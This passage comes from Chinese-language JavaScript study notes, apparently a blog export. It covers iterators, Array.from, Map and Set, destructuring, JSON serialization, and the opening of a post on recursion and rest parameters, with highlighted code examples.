<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> iterator = str[<span class="built_in">Symbol</span>.iterator]()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> res = iterator.next();</span><br><span class="line">  <span class="keyword">if</span> (res.done) <span class="keyword">break</span>;</span><br><span class="line">  res.value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Array-from-—-将可迭代或类数组转化为数组对象（可使用数组的方法）"><a href="#Array-from-—-将可迭代或类数组转化为数组对象（可使用数组的方法）" class="headerlink" title="Array.from — 将可迭代或类数组转化为数组对象（可使用数组的方法）"></a>Array.from — 将可迭代或类数组转化为数组对象（可使用数组的方法）</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><ul>
<li><strong>Iterable(可迭代):</strong> 实现了Symbol.iterator方法的对象</li>
<li><strong>Array-like(类数组):</strong> 有索引和length属性的对象</li>
</ul>
<h3 id="用例"><a href="#用例" class="headerlink" title="用例"></a>用例</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arrayLike = &#123;</span><br><span class="line">  <span class="number">0</span>: <span class="string">&quot;Hello&quot;</span>,</span><br><span class="line">  <span class="number">1</span>: <span class="string">&quot;World&quot;</span>,</span><br><span class="line">  length: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr = <span class="built_in">Array</span>.from(arrayLike);</span><br><span class="line">arr.pop(); <span class="comment">// &quot;World&quot;</span></span><br><span class="line">arr; <span class="comment">// [&quot;Hello&quot;]</span></span><br></pre></td></tr></table></figure>
<h3 id="Array-from还提供了一个可选参数—映射-mapping-函数"><a href="#Array-from还提供了一个可选参数—映射-mapping-函数" class="headerlink" title="Array.from还提供了一个可选参数—映射(mapping)函数"></a>Array.from还提供了一个可选参数—映射(mapping)函数</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.from(obj, mapFunction, thisArg); <span class="comment">// thisArg允许我们为设置该函数设置this</span></span><br></pre></td></tr></table></figure>
<p><strong>用例</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = <span class="built_in">Array</span>.from(range, <span class="function"><span class="params">num</span> =&gt;</span> num * num); <span class="comment">// 该函数会被应用于数组中的每个元素</span></span><br><span class="line">arr; <span class="comment">// [1,4,9,16,25]</span></span><br></pre></td></tr></table></figure>
<h3 id="字符串转换为数组"><a href="#字符串转换为数组" class="headerlink" title="字符串转换为数组"></a>字符串转换为数组</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> strArray = <span class="built_in">Array</span>.from(str);</span><br><span class="line"></span><br><span class="line">strArray; <span class="comment">// [&#x27;t&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;t&#x27;]</span></span><br></pre></td></tr></table></figure>
<h1 id="Map-and-Set-—-映射和集合"><a href="#Map-and-Set-—-映射和集合" class="headerlink" title="Map and Set — 映射和集合"></a>Map and Set — 映射和集合</h1><h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><ul>
<li>Map是带键的数据项，但与对象（会将其转换为字符串）不同，键可以是任意类型</li>
<li>使用set、get方法</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line"><span class="keyword">let</span> will = &#123;<span class="attr">name</span>:<span class="string">&quot;Will&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">map.set(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>); <span class="comment">// 字符串键</span></span><br><span class="line">map.set(<span class="number">1</span>, <span class="string">&#x27;world&#x27;</span>); <span class="comment">// 数字键</span></span><br><span class="line">map.set(<span class="literal">true</span>, <span class="string">&#x27;!!!&#x27;</span>); <span class="comment">// 布尔值键</span></span><br><span class="line">map.set(will, <span class="number">111</span>); <span class="comment">// 对象键</span></span><br><span class="line"></span><br><span class="line">map.get(<span class="string">&#x27;1&#x27;</span>); <span class="comment">// &#x27;hello&#x27;</span></span><br><span class="line">map.get(<span class="number">1</span>); <span class="comment">// &#x27;world&#x27;</span></span><br><span class="line">map.get(<span class="literal">true</span>); <span class="comment">// &#x27;!!!&#x27;</span></span><br><span class="line">map.get(will); <span class="comment">// 111</span></span><br><span class="line"></span><br><span class="line">map.size; <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<h3 id="链式调用"><a href="#链式调用" class="headerlink" title="链式调用"></a>链式调用</h3><p><code>map.set</code>调用会返回map本身</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">map.set(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">	.set(<span class="number">1</span>, <span class="string">&#x27;world&#x27;</span>)</span><br><span class="line">	.set(<span class="literal">true</span>, <span class="string">&#x27;!!!&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="Map迭代"><a href="#Map迭代" class="headerlink" title="Map迭代"></a>Map迭代</h3><p>在map中使用循环，可使用如下方法：</p>
<ul>
<li>map.keys() — 返回所有的键</li>
<li>map.values() — 返回所有的值</li>
<li>Map.entries() — 返回所有的键值对</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> recipe = <span class="keyword">new</span> <span class="built_in">Map</span>([</span><br><span class="line">  [<span class="string">&#x27;tomatoes&#x27;</span>, <span class="number">500</span>],</span><br><span class="line">  [<span class="string">&#x27;onion&#x27;</span>, <span class="number">300</span>],</span><br><span class="line">  [<span class="string">&#x27;bell pepper&#x27;</span>, <span class="number">50</span>]</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> veg <span class="keyword">of</span> recipe.keys()) &#123;</span><br><span class="line">  veg; <span class="comment">// tomatoes, onion, bell pepper</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> entry <span class="keyword">of</span> recipe.entries()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(entry); <span class="comment">// [&#x27;tomatoes&#x27;, 500], ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>forEach</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">recipe.forEach( <span class="function">(<span class="params">value, key, map</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;key&#125;</span>: <span class="subst">$&#123;value&#125;</span>`</span>);</span><br><span class="line">&#125; )</span><br></pre></td></tr></table></figure>
<h3 id="Object-entries-—-从对象—-gt-Map"><a href="#Object-entries-—-从对象—-gt-Map" class="headerlink" title="Object.entries — 从对象—&gt;Map"></a>Object.entries — 从对象—&gt;Map</h3><p><code>new Map([key, value], [key, value], ...)</code></p>
<p>Object.entries()可以返回对象的键值对数组（其格式完全符合<code>Map</code>所需）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">  name: <span class="string">&quot;Will&quot;</span>,</span><br><span class="line">  age: <span class="number">30</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>(<span class="built_in">Object</span>.entries(obj)); <span class="comment">// Object.entries返回键值对数组[[&#x27;name&#x27;,&#x27;Will&#x27;], [&#x27;age&#x27;, 30]]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(map.get(<span class="string">&#x27;name&#x27;</span>));</span><br></pre></td></tr></table></figure>
<h3 id="Object-fromEntries-—-从Map—-gt-对象"><a href="#Object-fromEntries-—-从Map—-gt-对象" class="headerlink" title="Object.fromEntries — 从Map—&gt;对象"></a>Object.fromEntries — 从Map—&gt;对象</h3><p>给定一键值对数组返回一个对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> prices = <span class="built_in">Object</span>.fromEntries([</span><br><span class="line">  [<span class="string">&#x27;banana&#x27;</span>, <span class="number">1</span>],</span><br><span class="line">  [<span class="string">&#x27;orange&#x27;</span>, <span class="number">2</span>],</span><br><span class="line">  [<span class="string">&#x27;apple&#x27;</span>, <span class="number">3</span>]</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(prices); <span class="comment">// &#123; banana: 1, orange: 2, apple: 3 &#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h2><p>Set是集合并且无重复值，其方法有：</p>
<ol>
<li>new Set(iterable) — 创建一个set，如有iterable，将从其中复制值到set中</li>
<li>set.add(value) — 添加一个值并返回set</li>
<li>set.delete(value) — 删除值，如该值存在则返回true，否则返回false</li>
<li>set.has(value) — 如value存在set中，则返回true；否则返回false</li>
<li>set.clear() — 清空set</li>
<li>set.size — 返回元素个数</li>
</ol>
<h3 id="可迭代-iterable"><a href="#可迭代-iterable" class="headerlink" title="可迭代(iterable)"></a>可迭代(iterable)</h3><p>可以使用<code>for...of</code>和<code>forEach</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="string">&quot;oranges&quot;</span>, <span class="string">&quot;apples&quot;</span>, <span class="string">&quot;bananas&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> value <span class="keyword">of</span> set) <span class="built_in">console</span>.log(value);</span><br><span class="line"></span><br><span class="line">set.forEach(<span class="function">(<span class="params">value, valueAgain, set</span>) =&gt;</span> <span class="built_in">console</span>.log(value));</span><br></pre></td></tr></table></figure>
<p><strong>用于迭代的方法（同Map）</strong></p>
<ul>
<li>set.keys()</li>
<li>set.values()</li>
<li>set.entries()</li>
</ul>
<h1 id="弱映射和弱集合（WeakMap-amp-WeakSet）"><a href="#弱映射和弱集合（WeakMap-amp-WeakSet）" class="headerlink" title="弱映射和弱集合（WeakMap &amp; WeakSet）"></a>弱映射和弱集合（WeakMap &amp; WeakSet）</h1><p>略</p>
<h1 id="Object-keys-values-entries"><a href="#Object-keys-values-entries" class="headerlink" title="Object.keys, values, entries"></a>Object.keys, values, entries</h1><ul>
<li>Object.keys(obj) — 返回一个包含该对象的所有键的数组</li>
<li>Object.values(obj) — 返回一个包含该对象的所有值的数组</li>
<li>Object.entries(obj) — 返回一个包含该对象所有键值对（即[key, value]）的数组</li>
</ul>
<h1 id="解构赋值"><a href="#解构赋值" class="headerlink" title="解构赋值"></a>解构赋值</h1><h2 id="数组（Array）解构"><a href="#数组（Array）解构" class="headerlink" title="数组（Array）解构"></a>数组（Array）解构</h2><p>基本结构为：<code>[变量名1, 变量名2, ...]=[...]</code></p>
<ol>
<li><p><strong>变量名无所谓</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;Will&quot;</span>, <span class="string">&quot;Koo&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [firstName, lastName] = arr;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>使用逗号忽略不想要的元素</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [firstName, , thirdOne] = [<span class="string">&quot;Will&quot;</span>, <span class="string">&quot;Sam&quot;</span>, <span class="string">&quot;Dion&quot;</span>, <span class="string">&quot;Ricky&quot;</span>];</span><br><span class="line"></span><br><span class="line">firstName; <span class="comment">// &quot;Will&quot;</span></span><br><span class="line">thirdOne; <span class="comment">// &quot;Dion&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><p><em><strong>任何可迭代对象都可以用数组解构赋值</strong></em></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [a,b,c] = <span class="string">&quot;USA&quot;</span>;</span><br><span class="line">[a,b,c]; <span class="comment">//[&#x27;U&#x27;,&#x27;S&#x27;,&#x27;A&#x27;]</span></span><br><span class="line"><span class="keyword">let</span> [one, two, three] = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;A&#x27;</span>]);</span><br></pre></td></tr></table></figure></li>
<li><p><strong>交换变量值</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> guest = <span class="string">&quot;People&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> admin = <span class="string">&quot;Will&quot;</span>;</span><br><span class="line"></span><br><span class="line">[guest, admin] = [admin, guest];</span><br><span class="line"></span><br><span class="line">[guest, admin]; <span class="comment">// [&#x27;Will&#x27;, &quot;People&quot;]</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>剩余…</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [name1, name2, ...rest] = [<span class="string">&quot;Will&quot;</span>, <span class="string">&quot;Dion&quot;</span>, <span class="string">&quot;Akshay&quot;</span>, <span class="string">&quot;Ricky&quot;</span>, <span class="string">&quot;Sam&quot;</span>];</span><br><span class="line"></span><br><span class="line">rest; <span class="comment">// [&quot;Akshay&quot;, &quot;Ricky&quot;, &quot;Sam&quot;]</span></span><br></pre></td></tr></table></figure></li>
<li><p>默认值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [name1=<span class="string">&quot;Anonymous&quot;</span>, name2=<span class="string">&quot;Will&quot;</span>] = [<span class="string">&quot;Dion&quot;</span>];</span><br><span class="line"></span><br><span class="line">name1; <span class="comment">// &quot;Dion&quot;</span></span><br><span class="line">name2; <span class="comment">// &quot;Will&quot;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="对象解构"><a href="#对象解构" class="headerlink" title="对象解构"></a>对象解构</h2><p>基本语法：<code>let &#123;var1, var2, ...&#125; = &#123;var1:..., var2:..., ...&#125;</code>，其中等号左侧的变量名顺序不重要，但<strong>变量名必须与右侧对象中的属性名一致</strong>。</p>
<p>用例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> personAdmin = &#123;</span><br><span class="line">  name: <span class="string">&quot;Will&quot;</span>,</span><br><span class="line">  age: <span class="number">24</span>,</span><br><span class="line">  major: <span class="string">&quot;CS&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123;name, age, major&#125; = personAdmin;</span><br></pre></td></tr></table></figure>
<ol>
<li><p><strong>更改左侧的变量名</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;<span class="attr">name</span>: n, <span class="attr">age</span>: a, major&#125; = personAdmin;</span><br><span class="line">n; <span class="comment">// &quot;Will&quot;</span></span><br><span class="line">a; <span class="comment">// 24</span></span><br><span class="line">major; <span class="comment">// &quot;CS&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>默认值  =</strong> </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line">  name: <span class="string">&quot;Dave&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123;name, age=<span class="number">90</span>, job=<span class="string">&quot;Invester&quot;</span>&#125; = person;</span><br><span class="line">name; <span class="comment">// &quot;Dave&quot;</span></span><br><span class="line">age; <span class="comment">//90</span></span><br><span class="line">job; <span class="comment">// &quot;Inverster&quot;</span></span><br></pre></td></tr></table></figure>
<p>结合：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;name, <span class="attr">age</span>: a = <span class="number">90</span>, <span class="attr">job</span>: j = <span class="string">&quot;Invester&quot;</span>&#125; = person;</span><br><span class="line">name; <span class="comment">// &quot;Dave&quot;</span></span><br><span class="line">a; <span class="comment">//90</span></span><br><span class="line">j; <span class="comment">// &quot;Inverster&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>剩余…</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;name, ...others&#125; = personAdmin;</span><br><span class="line"></span><br><span class="line">name; <span class="comment">// &quot;Will&quot;</span></span><br><span class="line">others; <span class="comment">// &#123;age: 24, major: &quot;CS&quot;&#125;</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>提前声明变量，之后调用</strong></p>
<p>不使用<code>let</code>时进行解构赋值，需要在最外侧加一个圆括号。这是因为<strong>JS会将主代码流的<code>&#123;...&#125;</code>当作一个代码块</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> name, age, major;</span><br><span class="line"></span><br><span class="line">(&#123;name, age, major&#125; = personAdmin);</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><p><strong>定义：</strong>JSON（JavaScript Object Notation）是表示值和对象的通用格式</p>
<h2 id="JSON-stringify-—-将对象转为JSON"><a href="#JSON-stringify-—-将对象转为JSON" class="headerlink" title="JSON.stringify — 将对象转为JSON"></a>JSON.stringify — 将对象转为JSON</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> student = &#123;</span><br><span class="line">  name: <span class="string">&#x27;John&#x27;</span>,</span><br><span class="line">  age: <span class="number">30</span>,</span><br><span class="line">  isAdmin: <span class="literal">false</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> json = <span class="built_in">JSON</span>.stringify(student);</span><br><span class="line"><span class="keyword">typeof</span> json; <span class="comment">// &#x27;string&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>注：</strong>通过<code>JSON.stringify()</code>方法将对象转换为字符串的过程称为 <strong>JSON编码</strong> 或 <strong>序列化（serialized）</strong>或<strong>字符串化</strong> 或 <strong>编组化</strong> </p>
</li>
<li><p><code>JSON</code>支持一下数据类型：</p>
<ol>
<li>Object <code>&#123;...&#125;</code></li>
<li>Array <code>[...]</code></li>
<li>Primitive:<ol>
<li>string</li>
<li>number</li>
<li>boolean</li>
<li>null</li>
</ol>
</li>
</ol>
</li>
<li><p>不能有循环引用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">  rank: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = &#123;</span><br><span class="line">  rank: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">b.teacher = a;</span><br><span class="line">a.student = b;</span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringfiy(b); <span class="comment">// Error</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="JSON-stringify完整语法"><a href="#JSON-stringify完整语法" class="headerlink" title="JSON.stringify完整语法"></a>JSON.stringify完整语法</h3><p>JSON的完整语法为： <code>JSON.stringify(value, replacer, space)</code>。</p>
<p>其中：</p>
<ol>
<li><strong>value</strong> — 要编码的对象</li>
<li><strong>replacer</strong> — 要编码的属性数组（或者使用映射函数）</li>
<li><strong>space</strong> — 用于格式化的空格数量</li>
</ol>
<ul>
<li><p>使用完整语法避免循环引用报错</p>
<ol>
<li>使用属性数组</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">  rank: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = &#123;</span><br><span class="line">  rank: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">b.teacher = a;</span><br><span class="line">a.student = b;</span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringify(b, [<span class="string">&#x27;rank&#x27;</span>, <span class="string">&#x27;teacher&#x27;</span>]); <span class="comment">// &#x27;&#123;&quot;rank&quot;:2,&quot;teacher&quot;:&#123;&quot;rank&quot;:1&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>使用映射函数</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.stringify(b, <span class="function"><span class="keyword">function</span> <span class="title">replacer</span>(<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (key === <span class="string">&#x27;student&#x27;</span>) ? <span class="literal">undefined</span> : value;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="自定义toJSON"><a href="#自定义toJSON" class="headerlink" title="自定义toJSON"></a>自定义toJSON</h3><p><strong>说明：</strong>如果对象有<code>toJSON</code>方法，则<code>JSON.stringify</code>会自动调用该方法</p>
<p>例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">  rank: <span class="number">1</span>,</span><br><span class="line">  <span class="function"><span class="title">toJSON</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.rank;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = &#123;</span><br><span class="line">  rank: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">b.teacher = a;</span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringify(a); <span class="comment">// &#x27;1&#x27;</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify(b); <span class="comment">// &#x27;&#123;&quot;rank&quot;:2,&quot;teacher&quot;:1&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="JSON-parse-—-将JSON字符串转换为合适的数据格式"><a href="#JSON-parse-—-将JSON字符串转换为合适的数据格式" class="headerlink" title="JSON.parse — 将JSON字符串转换为合适的数据格式"></a>JSON.parse — 将JSON字符串转换为合适的数据格式</h2><p>基本语法：<code>JSON.parse(str, reviver)</code></p>
<p>其中：</p>
<ul>
<li><strong>str：</strong>要解析的JSON字符串</li>
<li><strong>reviver：</strong>可选函数，该函数对每个键值对<code>(key, value)</code>调用，并可改变其值</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> nums = <span class="string">&quot;[0,1,2,3]&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> arrNums = <span class="built_in">JSON</span>.parse(nums);</span><br><span class="line">arrNums; <span class="comment">// [0,1,2,3]</span></span><br></pre></td></tr></table></figure>
<h3 id="使用reviver"><a href="#使用reviver" class="headerlink" title="使用reviver"></a>使用reviver</h3><p>用例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> meetingJSON = <span class="string">&#x27;&#123;&quot;title&quot;: &quot;Conference&quot;, &quot;date&quot;: &quot;2021-10-04T16:00:00.000Z&quot;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wrongWay = <span class="built_in">JSON</span>.parse(meetingJSON);</span><br><span class="line">wrongWay; <span class="comment">// &#123;title: &#x27;Conference&#x27;, date: &#x27;2021-10-04T16:00:00.000Z&#x27;&#125; 可以看到date的值是字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> meetingObj = <span class="built_in">JSON</span>.parse(meetingJSON, <span class="function"><span class="keyword">function</span>(<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (key === <span class="string">&#x27;date&#x27;</span>) ? <span class="keyword">new</span> <span class="built_in">Date</span>(value) : value;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">meetingObj; <span class="comment">// &#123;title: &#x27;Conference&#x27;, date: Mon Oct 04 2021 17:00:00 GMT+0100 (British Summer Time)&#125;</span></span><br><span class="line">meetingObj.date.getDate(); <span class="comment">// 可以正常运行</span></span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>JSON是一种数据格式</li>
<li>JSON支持object, array, string, number, boolean, null</li>
<li>JavaScript提供序列化（serialize）成JSON的方法<code>JSON.stringify</code>和解析JSON的方法<code>JSON.parse</code></li>
<li>如果一个对象有<code>toJSON</code>方法，那么<code>JSON.stringify</code>会自动调用</li>
</ul>
]]></content>
      <categories>
        <category>Frontend/前端</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript函数进阶---学习笔记</title>
    <url>/2021/10/04/JavascriptFunction/</url>
    <content><![CDATA[<p><strong>本章将深入J高级，诸如Spread语法、闭包、垃圾回收机制、函数对象、SetTimeout和SetInterval、装饰器模式和转发call/apply以及箭头函数。</strong></p>
<a id="more"></a>

<h1 id="递归和堆栈"><a href="#递归和堆栈" class="headerlink" title="递归和堆栈"></a>递归和堆栈</h1><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>一个函数在其内部调用自身，就是所谓的<strong>递归</strong></p>
<h3 id="递归和迭代（即循环）-—-两种思考方式"><a href="#递归和迭代（即循环）-—-两种思考方式" class="headerlink" title="递归和迭代（即循环） — 两种思考方式"></a>递归和迭代（即循环） — 两种思考方式</h3><ol>
<li>递归通常是将函数调用简化为一个更简单的函数调用，然而再将其简化为一个更简单的函数调用，如此反复，直到<strong>基础的递归</strong>（结果显而易见的）</li>
<li><strong>递归深度：</strong>最大的嵌套调用次数。在JS中，最大递归深度受限于JS引擎，引擎在最大递归深度小于等于10000时是可靠的。</li>
<li><strong>任何递归都可以用迭代（即循环）来重写。</strong>同时，循环算法更节省内存。但对于大多数任务来说，递归方法足够快，并且容易编写和维护。</li>
</ol>
<h2 id="执行上下文和堆栈-—-递归调用如何工作"><a href="#执行上下文和堆栈-—-递归调用如何工作" class="headerlink" title="执行上下文和堆栈 — 递归调用如何工作"></a>执行上下文和堆栈 — 递归调用如何工作</h2><p><strong>定义：</strong>执行上下文是一个内部数据结构，包含函数执行的详细细节（当前控制流所在位置，当前变量，this的值以及其他）</p>
<p><strong>当一个函数进行嵌套调用时：</strong></p>
<ol>
<li>当前函数被暂停</li>
<li>与它相关的执行上下文被<strong>执行上下文堆栈</strong>的特殊数据结构保存</li>
<li>执行嵌套调用</li>
<li>嵌套调用结束，从堆栈恢复之前的执行上下文，并从停止的位置继续执行</li>
</ol>
<h2 id="递归遍历-—-递归的应用之一"><a href="#递归遍历-—-递归的应用之一" class="headerlink" title="递归遍历 — 递归的应用之一"></a>递归遍历 — 递归的应用之一</h2><h2 id="递归结构"><a href="#递归结构" class="headerlink" title="递归结构"></a>递归结构</h2><h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><h1 id="Rest参数与Spread语法"><a href="#Rest参数与Spread语法" class="headerlink" title="Rest参数与Spread语法"></a>Rest参数与Spread语法</h1><ul>
<li>rest参数作用：传入任意数量的参数</li>
<li>Spread作用：数组作为参数传入给支持任意数量参数的函数</li>
</ul>
<h2 id="Rest参数-—"><a href="#Rest参数-—" class="headerlink" title="Rest参数 — ..."></a>Rest参数 — <code>...</code></h2><p><strong>首先</strong>，在JavaScript中，无论函数是如何定义的，都可以传入任意数量的参数，并且不会报错，但只会将前n各定义的参数进行调用，而忽略多余的参数。</p>
<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p><code>...剩余参数数组名</code></p>
<p>例1：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sumAll</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>  (<span class="keyword">let</span> item <span class="keyword">of</span> args) &#123;</span><br><span class="line">    sum += item;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(sumAll(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)); <span class="comment">// 10</span></span><br></pre></td></tr></table></figure>
<p>例2:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">members</span>(<span class="params">m1, m2, ...others</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(m1);</span><br><span class="line">  <span class="built_in">console</span>.log(m2);</span><br><span class="line">  <span class="built_in">console</span>.log(others.length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">members(<span class="string">&#x27;Will&#x27;</span>, <span class="string">&#x27;Dion&#x27;</span>, <span class="string">&#x27;Akshay&#x27;</span>, <span class="string">&#x27;Sam&#x27;</span>); <span class="comment">// &#x27;Will&#x27;, &#x27;Dion&#x27;, 2</span></span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong><code>...Rest</code>必须放在参数列表的最后，否则会报错</p>
